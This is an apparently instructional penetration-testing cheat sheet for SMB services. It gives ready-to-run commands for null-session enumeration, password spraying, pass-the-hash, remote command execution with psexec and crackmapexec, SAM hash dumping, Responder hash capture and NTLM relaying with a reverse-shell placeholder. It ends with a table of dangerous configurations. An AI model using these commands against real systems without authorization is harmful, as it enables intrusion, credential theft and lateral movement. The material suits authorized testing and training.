### SMB Service Identification

**SMB (Server Message Block)** facilitates shared access to files and printers. On modern Windows systems, it runs directly over **TCP port 445**, while legacy or non-Windows systems may use **TCP port 139** (NetBIOS over TCP/IP). Identification is the first step to determine the implementation (Windows vs. Samba) and potential attack vectors.

|Port|Protocol/Service|Context|
|:--|:--|:--|
|**139/TCP**|SMB over NetBIOS|Found on non-Windows hosts or Windows with NetBIOS enabled.|
|**445/TCP**|SMB over TCP/IP|Standard for modern Windows.|

**Initial Enumeration Scan** Use Nmap to identify the service version and basic configuration. Note that Windows OS version info is often guessed rather than explicitly provided in scan results.

```
sudo nmap <TARGET_IP> -sV -sC -p139,445
```

---

### Null Session Enumeration

**When to use:** Use when no credentials are provided to check for **anonymous authentication**. **Why it matters:** Misconfigured servers may allow attackers to list shares, users, groups, and permissions without a password.

#### 1. Share and Permission Enumeration

Identify accessible directories and the level of access (READ/WRITE).

|Tool|Command|Goal|
|:--|:--|:--|
|**smbclient**|`smbclient -N -L //<TARGET_IP>`|List available shares using a null session (`-N`).|
|**smbmap**|`smbmap -H <TARGET_IP>`|List shares and associated **permissions**.|
|**smbmap**|`smbmap -H <TARGET_IP> -r <SHARE_NAME>`|Recursively browse a specific directory.|

#### 2. Specialized Enumeration Tools

Automate the collection of NetBIOS names, workgroups, and user lists.

- **enum4linux-ng**: Use to automate the discovery of OS information, share lists, and password policies.
    
    ```
    ./enum4linux-ng.py <TARGET_IP> -A -C
    ```
    
- **rpcclient**: Connect to the **MSRPC** interface via a null session to query the system directly.
    
    ```
    rpcclient -U'%' <TARGET_IP>
    # Inside rpcclient prompt:
    enumdomusers
    ```
    

---

### Authenticated Attacks

**When to use:** When null sessions are disabled or yield limited info, use obtained or guessed credentials.

#### 1. Password Spraying

**Scenario:** Use when you have a list of usernames but no passwords. This avoids **account lockout** by trying one common password against many users.

```
crackmapexec smb <TARGET_IP> -u <USER_LIST_FILE> -p '<PASSWORD>' --local-auth
```

- **Note:** Use `--continue-on-success` to keep testing the list after a match is found.
- **Note:** Use `--local-auth` if the target is not part of a domain.

#### 2. Pass-the-Hash (PtH)

**Scenario:** Use when you have an **NTLM hash** but cannot crack it. This allows authentication without the plaintext password.

```
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>
```

---

### Remote Code Execution (RCE)

**When to use:** After obtaining **Administrator** or high-privilege credentials to gain full system control.

#### 1. Impacket-PsExec

Deploys a service to the `ADMIN$` share and uses the Service Control Manager to start a shell via a named pipe.

```
impacket-psexec <USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

#### 2. CrackMapExec Execution

Fast execution of single commands or PowerShell scripts across one or multiple hosts.

```
# Execute via smbexec (CMD)
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -x '<COMMAND>' --exec-method smbexec

# Execute via atexec (PowerShell)
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X '<POWERSHELL_COMMAND>'
```

---

### Post-Exploitation & Data Extraction

Once administrative access is achieved, focus on lateral movement and credential harvesting.

|Action|Command|Purpose|
|:--|:--|:--|
|**Dump SAM Hashes**|`crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --sam`|Extract local user hashes for cracking or PtH.|
|**List Logged-on Users**|`crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --loggedon-users`|Identify active users to target for further attacks.|
|**Download Files**|`smbmap -H <TARGET_IP> --download "<SHARE>\<PATH>"`|Retrieve sensitive files like `note.txt`.|

---

### Forced Authentication & Relaying

**Scenario:** Use when you are on the same network as the victim and can intercept name resolution traffic (LLMNR/NBT-NS).

#### 1. Capturing Hashes (Responder)

Spoof responses to mistyped network resource requests to capture **NetNTLM v1/v2 hashes**.

```
sudo responder -I <INTERFACE>
```

- **Attack Implication:** Captured hashes can be cracked offline using `hashcat` (Mode 5600 for NetNTLMv2).

#### 2. NTLM Relaying

**Scenario:** If a hash cannot be cracked, relay it to another machine to gain access. This requires SMB signing to be disabled on the target.

1. Disable SMB in `Responder.conf` to allow the relay tool to bind to port 445.
2. Execute the relay to dump the SAM database or trigger a reverse shell.

```
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<REVERSE_SHELL_COMMAND>'
```

---

### Dangerous Configurations Table

| Setting                    | Risk                                | Impact                                            |
| :------------------------- | :---------------------------------- | :------------------------------------------------ |
| **Null Session Enabled**   | Anonymous access to shares/RPC.     | Information disclosure (users, shares, policies). |
| **SMB Signing Disabled**   | Allows NTLM relay attacks.          | Unauthorized access/RCE on the target.            |
| **READ/WRITE on Shares**   | Unrestricted file access.           | Data theft or malicious file upload.              |
| **Shared Admin Passwords** | Credentials work on multiple hosts. | Rapid lateral movement across the network.        |